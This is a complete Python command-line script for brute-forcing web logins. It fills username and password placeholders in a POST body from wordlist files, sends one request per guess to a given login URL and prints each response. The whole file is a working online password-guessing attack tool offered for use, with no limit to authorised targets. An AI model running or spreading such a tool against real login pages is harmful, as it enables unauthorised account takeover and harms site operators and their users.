#!/usr/bin/python3

import requests
import argparse
import sys


def parse_args():
    args_parser = argparse.ArgumentParser(
        description="Web login bruteforcer", usage='%(prog)s -d request_data [-uw usersfile] [-pw passwords file] [-upw user:password file] URL')

    args_parser.add_argument('URL', metavar='url',
                             type=str, help="POST login request url")
    args_parser.add_argument('-d',
                             '--data',
                             action='store',
                             required=True,
                             help='POST request data as string. use __USER__ and __PASS__ as placeholders to be changed by the program.')
    args_parser.add_argument('-uw',
                             '--users',
                             action='store',
                             help='Users file')
    args_parser.add_argument('-pw',
                             '--passwords',
                             action='store',
                             help='Passwords file')
    args_parser.add_argument('-upw',
                             '--usr_pass',
                             action='store',
                             help='user:password file')
    args = args_parser.parse_args()

    if not args.users and not args.passwords and not args.usr_pass:
        args_parser.error("You must specify at least one list file")
    if (args.users or args.passwords) and args.usr_pass:
        args_parser.error(
            "You cannot specify user:pass file in this case. You already specified an user or password list file")
    if (args.users and args.passwords):
        args_parser.error(
            "Use user:pass list file with the option '-upw' instead of separate user and password files")
    if "__USER__" in args.data and not(args.users or args.usr_pass):
        args_parser.error(
            "__USER__ placeholder specified in request data but no users file")
    if "__PASS__" in args.data and not(args.passwords or args.usr_pass):
        args_parser.error(
            "__PASS__ placeholder specified in request data but no password file")

    cred_files = {
        'user': args.users if args.users else '',
        'pass': args.passwords if args.passwords else '',
        'user_pass': args.usr_pass if args.usr_pass else '',
    }
    return args.URL, args.data, cred_files


def get_replaced_data(data, d):
    data_to_replace = data
    for placeholder, value in d.items():
        if value:
            data_to_replace = data_to_replace.replace(placeholder, value, 1)
    return data_to_replace


def user_replace(placeholder_data, row):
    return get_replaced_data(placeholder_data, {"__USER__": row})


def pass_replace(placeholder_data, row):
    return get_replaced_data(placeholder_data, {"__PASS__": row})


def user_pass_replace(placeholder_data, row):
    data_to_replace = placeholder_data
    row = row.split(":", 1)
    if len(row) == 2:
        user = row[0]
        passw = row[1]
        return get_replaced_data(placeholder_data, {"__USER__": user, "__PASS__": passw})
    else: 
        return placeholder_data


def send_requests(url, list_file, placeholder_data, replace_func):
    with open(list_file, "r") as lf:
        while row := lf.readline().strip():
            req_data = replace_func(placeholder_data, row)
            try:
                print(f"Sending: '{req_data}'")
                res = requests.post(url, data=req_data, timeout=5)
                print(res.content)
            except requests.RequestException:
                print(
                    f"Error while trying to send POST request to '{url}' with data '{req_data}'")


def main():
    url, placeholder_data, files = parse_args()
    if files.get("user_pass"):
        send_requests(url, files.get("user_pass"),
                      placeholder_data, user_pass_replace)
    elif files.get("user"):
        send_requests(url, files.get("user"), placeholder_data, user_replace)
    elif files.get("pass"):
        send_requests(url, files.get("pass"), placeholder_data, pass_replace)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Interrupted by user")
        
